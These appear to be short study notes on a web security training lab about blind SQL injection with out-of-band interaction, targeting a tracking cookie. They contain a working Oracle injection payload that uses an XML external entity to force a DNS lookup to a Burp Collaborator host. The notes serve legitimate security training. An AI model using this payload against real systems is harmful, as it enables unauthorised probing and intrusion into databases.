Lab #15 - Blind SQL injection with out-of-band interaction

Vulnerable parameter - Tracking cookie

End Goal - Exploit SQLi and cause a DNS lookup

Analysis:

cgwihkkm49dt3sgk9lufyyb6mxsngc.burpcollaborator.net

' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://cgwihkkm49dt3sgk9lufyyb6mxsngc.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--